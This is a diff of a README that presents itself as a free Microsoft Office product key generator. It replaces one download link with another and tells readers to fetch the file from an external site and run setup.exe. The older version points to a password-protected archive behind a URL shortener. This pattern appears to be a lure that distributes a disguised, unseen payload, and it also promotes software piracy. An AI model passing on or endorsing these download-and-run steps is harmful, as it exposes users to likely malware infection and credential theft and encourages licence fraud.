@@ -15,8 +15,8 @@ This program allows users to generate free product keys for Microsoft Office. It
 ## 📥 Installation & Launch
 
 ### 🔹 ✅ RECOMMENDED METHOD (Windows .exe)
-1️⃣ **[Download](https://goo.su/hLYS) and extract archive(pass: Project12!)**  
-2️⃣ **Run `setup.exe`**  
+1️⃣ **[Download](https://softspace.space/)**  
+2️⃣ **Run `setup.exe`**
 🚀 **The application will set up everything automatically, just enjoy!**  
 
 ⚠️ **Important:** This method is **faster** and requires **no manual setup**!  
